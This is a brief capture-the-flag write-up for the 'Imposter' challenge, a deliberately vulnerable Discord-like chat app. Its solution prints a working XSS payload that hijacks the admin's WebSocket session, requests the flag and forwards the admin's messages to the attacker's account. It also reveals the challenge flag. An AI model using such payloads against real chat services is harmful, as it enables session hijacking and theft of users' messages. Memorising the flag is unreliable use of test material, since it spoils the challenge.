# Imposter

Author: `tacex`

I'm not a big fan of Discord's new ToS changes, so I'm making my own crappy version of Discord that isn't overly invasive.

## Solution

The webapp is very vulnerable to XSS, or more specifically CSWSH. It is possible to send a socket message as admin to get the flag from the server and send it to yourself. Send the following payload to `admin#0000` to win.

<script>s=io();s.on('connect', function() {s.emit('join')});s.on('message', function(data){s.emit('json',{'to':'lmao#9370','message':data.content,'time':'00:00:00 AM'}); s.close()});setTimeout(function() {s.emit('flag')},500)</script>

Flag: `gigem{its_like_xss_but_with_extra_steps}`
